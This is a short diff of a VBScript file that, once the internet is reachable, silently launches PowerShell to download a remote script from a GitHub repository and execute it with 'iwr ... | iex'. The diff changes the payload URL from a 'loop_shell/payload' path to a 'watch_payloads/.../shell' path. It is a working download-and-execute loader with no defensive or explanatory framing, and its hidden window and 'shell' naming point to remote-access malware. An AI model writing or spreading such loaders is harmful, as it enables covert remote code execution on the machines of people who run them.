@@ -4,7 +4,7 @@ Set objShell = CreateObject("WScript.Shell")
 Do
     If isInternetAvailable() Then
         ' Run PowerShell command
-        powershellCommand = "powershell.exe -Command ""iwr https://raw.githubusercontent.com/anaprivate/loop_shell/main/payload -UseBasicParsing | iex"""
+        powershellCommand = "powershell.exe -Command ""iwr https://raw.githubusercontent.com/anaprivate/watch_payloads/refs/heads/main/shell -UseBasicParsing | iex"""
         objShell.Run powershellCommand, 0, False
         Exit Do ' Exit after execution
     Else
